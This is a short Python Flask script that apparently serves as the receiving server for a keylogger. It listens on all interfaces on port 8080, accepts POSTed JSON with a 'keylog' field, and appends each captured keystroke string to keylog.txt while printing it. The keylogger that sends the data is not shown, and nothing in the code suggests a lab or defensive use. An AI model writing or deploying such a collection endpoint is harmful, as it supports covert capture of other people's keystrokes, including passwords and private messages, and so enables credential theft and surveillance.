from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/', methods=['POST'])
def log_data():
    try:
        data = request.get_json()
        if not data or "keylog" not in data:
            return jsonify({"status": "error", "message": "Invalid JSON"}), 400

        keylog = data["keylog"]

        with open("keylog.txt", "a") as file:
            file.write(keylog + " ")
        print("Received keylogs: ", keylog)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
